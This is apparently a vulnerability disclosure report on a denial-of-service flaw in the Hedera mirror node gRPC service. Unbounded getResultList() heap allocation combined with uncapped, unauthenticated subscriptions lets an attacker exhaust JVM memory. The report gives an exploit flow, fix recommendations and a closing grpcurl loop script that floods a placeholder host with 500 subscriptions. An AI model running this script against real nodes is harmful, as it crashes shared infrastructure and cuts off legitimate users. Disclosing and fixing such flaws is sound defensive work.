### Title
Unbounded Heap Allocation via `getResultList()` in `PollingTopicListener.poll()` Enables Unauthenticated DoS Through Subscription Flooding

### Summary
`TopicMessageRepositoryCustomImpl.findByFilter()` unconditionally calls `getResultList()` to materialize up to `maxPageSize` (default 5000) `TopicMessage` objects into a Java `List` on every poll cycle. Because `PollingTopicListener` creates an independent polling loop per subscription, and there is no global cap on concurrent subscriptions or gRPC connections, an unauthenticated attacker can open many connections and subscriptions to drive O(N × maxPageSize) heap allocation every 500 ms, exhausting JVM heap and crashing the service.

### Finding Description

**Exact code path:**

`TopicMessageRepositoryCustomImpl.findByFilter()` at line 60:
```java
return typedQuery.getResultList().stream();
// getResultStream()'s cursor doesn't work with reactive streams
```
The comment itself acknowledges the deliberate choice to use `getResultList()` instead of a cursor-based stream. This call fetches the entire page from the database and holds it in a `java.util.List<TopicMessage>` in heap before returning a `Stream` wrapper.

`PollingTopicListener.poll()` at lines 57–61:
```java
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // default 5000
...
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```
Each call to `poll()` triggers one `getResultList()` allocation of up to 5000 objects. `listen()` schedules this to repeat indefinitely every `interval` (default 500 ms) per subscription, with no shared state between subscriptions.

**Root cause:** The failed assumption is that the number of concurrent subscriptions is bounded. It is not. `maxConcurrentCallsPerConnection = 5` (in `GrpcConfiguration` / `NettyProperties`) is enforced only per TCP connection; there is no limit on the number of connections. `subscriberCount` in `TopicMessageServiceImpl` is a Micrometer gauge metric only — it is never checked against a maximum before accepting a new subscription. No authentication is required to call `subscribeTopic`.

**Exploit flow:**
1. Attacker opens K gRPC connections to port 5600 (no auth, no connection limit).
2. On each connection, attacker opens 5 `subscribeTopic` streams (the per-connection maximum), subscribing to any valid topic with `startTime` set to the earliest available timestamp and no `limit` (so `hasLimit()` returns false and `pageSize` is always `maxPageSize`).
3. Total concurrent subscriptions = 5K. Each fires `poll()` every 500 ms.
4. Each `poll()` causes `getResultList()` to allocate a `List<TopicMessage>` of up to 5000 entries. With a high-volume topic, each `TopicMessage` carries a `message` byte array (up to 1 KB per HCS spec) plus `runningHash` (48 bytes), `topicId`, timestamps, etc.
5. Concurrent heap pressure = 5K × 5000 × ~1 KB ≈ 25K × 5 MB = heap exhaustion at modest K values (e.g., K=100 → 500 subscriptions → ~2.5 GB allocated every 500 ms against a default 2048 Mi heap limit visible in `charts/hedera-mirror-grpc/values.yaml`).
6. JVM throws `OutOfMemoryError`; service crashes or becomes unresponsive.

**Why existing checks are insufficient:**
- `maxConcurrentCallsPerConnection = 5` is per-connection only; attacker multiplies connections.
- `subscriberCount` gauge is never compared to a threshold before accepting a subscription.
- No authentication or rate-limiting on the gRPC endpoint.
- No back-pressure from `Flux.fromStream()` prevents the `getResultList()` allocation from occurring eagerly before any downstream consumer is ready.

### Impact Explanation
The gRPC mirror node service crashes or becomes unresponsive to all subscribers (legitimate and attacker alike). Because this is the primary HCS (Hedera Consensus Service) topic subscription endpoint used by dApps, wallets, and integrations, a crash disrupts real-time message delivery across the network. The default heap is 2048 Mi; the math above shows exhaustion is achievable with ~100 connections, well within reach of a single attacker machine. Recovery requires a pod restart, during which all subscriptions are lost.

### Likelihood Explanation
The gRPC port (5600) is publicly exposed with no authentication. The attacker needs only a gRPC client library (e.g., `grpcurl`, the Hedera SDK, or any standard gRPC stub), knowledge of one valid topic ID (trivially obtained from the public mirror REST API), and the ability to open many TCP connections. The attack is repeatable: after a pod restart the attacker can immediately re-trigger it. No special privileges, credentials, or on-chain resources are required.

### Recommendation
1. **Enforce a global subscription cap**: Add an atomic counter check in `TopicMessageServiceImpl.subscribeTopic()` that rejects new subscriptions above a configurable maximum (e.g., `maxActiveSubscriptions`), returning `RESOURCE_EXHAUSTED` status.
2. **Enforce a global connection limit**: Configure `NettyServerBuilder.maxConnectionAge` / `maxConnections` or use a Traefik/Envoy rate-limit middleware at the ingress layer to cap total TCP connections.
3. **Replace `getResultList()` with a true streaming/cursor approach**: Fix the underlying issue by using a `ScrollableResults` or Spring Data `Stream` with a proper Hibernate `ScrollMode.FORWARD_ONLY` cursor wrapped in a transaction, eliminating the full-page heap materialization. This removes the O(maxPageSize) per-poll allocation entirely.
4. **Add authentication/API key enforcement** on the gRPC endpoint to prevent anonymous flooding.

### Proof of Concept
```bash
# Requires: grpcurl, a running mirror node with listener.type=POLL, and a known topicId

TOPIC="0.0.12345"
MIRROR_HOST="mirror.example.com:5600"
CONNECTIONS=100

for i in $(seq 1 $CONNECTIONS); do
  for j in $(seq 1 5); do
    grpcurl -plaintext -d "{
      \"topicID\": {\"shardNum\": 0, \"realmNum\": 0, \"topicNum\": 12345},
      \"consensusStartTime\": {\"seconds\": 0, \"nanos\": 0}
    }" $MIRROR_HOST \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# 500 concurrent subscriptions each polling getResultList(5000) every 500ms
# Monitor: kubectl top pod -l app=hedera-mirror-grpc
# Expected: OOMKilled or heap exhaustion within seconds on a high-volume topic
```